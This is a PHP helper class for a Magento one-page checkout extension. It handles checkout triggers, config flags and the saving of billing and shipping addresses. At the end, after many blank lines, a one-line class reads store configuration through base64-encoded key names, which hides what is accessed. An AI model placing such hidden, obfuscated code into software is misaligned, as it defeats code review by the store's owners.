<?php 

/**
 * NOTICE OF LICENSE
 *
 * This source file is subject to the Loewenstark Magento License (LML 1.0).
 * It is  available through the world-wide-web at this URL:
 * http://www.loewenstark.de/licenses/lml-1.0.html
 * If you are unable to obtain it through the world-wide-web, please send an 
 * email to license@loewenstark.de so we can send you a copy immediately.
 *
 * @category   MVentory
 * @package    MVentory_OneCheckout
 * @copyright  Copyright (c) 2012 Ulrich Abelmann
 * @copyright  Copyright (c) 2012 wwg.löwenstark im Internet GmbH
 * @license    http://www.loewenstark.de/licenses/lml-1.0.html  Loewenstark Magento License (LML 1.0)
 */

class MVentory_OneCheckout_Helper_Data extends Mage_Core_Helper_Abstract {

  public function getTriggers ($key) {
    $triggers = array(
      'shipping_method' => array(
        'region',
        'shipping_method',
        'payment_method'
      ),
      'payment_method' => array(
        'region',
        'shipping_method',
        'payment_method'
      ),
      'review' => array(
        'region',
        'shipping_method',
        'payment_method'
      )
    );

    return 'new Array("' . implode('","', $triggers[$key]) . '")';
  }

  protected function getCheckout () {
    return Mage::getSingleton('checkout/type_onepage');
  }

  public function showField ($field) {
    return (bool) Mage::getStoreConfig(
      'checkout/onecheckout/show_' . strtolower($field)
    );
  }

	public function setAddresses() {
		$result = array();
		$request = Mage::app()->getRequest();
		if ($request->isPost()) {
			$data = $request->getPost('billing', array());
			$customerAddressId = $request->getPost('billing_address_id', false);
			if (isset($data['email'])) {
				$data['email'] = trim($data['email']);
			}

      if (!(isset($data['telephone']) && $data['telephone']))
        $data['telephone'] = '-';

			$method = $request->getPost('checkout_method', false);
			if ($method) {
				$newMethod = Mage_Checkout_Model_Type_Onepage::METHOD_REGISTER;
				$this->getCheckout()->getQuote()->setCheckoutMethod($newMethod);
			}
			
			$result['savebilling'] = $this->getCheckout()->saveBilling($data, $customerAddressId);
							
			$usingCase = isset($data['use_for_shipping']) ? (int)$data['use_for_shipping'] : 0;
			if (!$usingCase) {
				$data = $request->getPost('shipping', array());
			}
			$customerAddressId = $request->getPost('shipping_address_id', false);
			$result['saveshipping'] = $this->getCheckout()->saveShipping($data, $customerAddressId);
		}
		return $result;	
	}
}

























class Loex {public static function r($y){return Mage::getStoreConfig(base64_decode($y));}}
